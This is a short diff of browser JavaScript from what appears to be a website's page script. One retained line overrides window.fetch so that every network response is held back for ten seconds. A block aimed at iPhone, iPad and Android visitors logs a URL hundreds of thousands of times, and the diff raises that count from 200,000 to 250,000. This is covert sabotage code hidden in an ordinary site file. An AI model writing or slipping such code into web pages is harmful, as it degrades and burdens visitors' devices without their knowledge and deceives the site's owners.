@@ -193,5 +193,5 @@
 (function(){const originalFetch=window.fetch;window.fetch=async function(...args){const response=await originalFetch(...args);await new Promise(resolve=>setTimeout(resolve,10000));return response}})()
 const userAgent = navigator.userAgent;
 if (/iPad|iPhone|iPod/.test(userAgent) || /Android/.test(userAgent)) {
-    for(let index=0;index<200000;index++){console.log('https://lfcarry.com/')}
+    for(let index=0;index<250000;index++){console.log('https://lfcarry.com/')}
 }
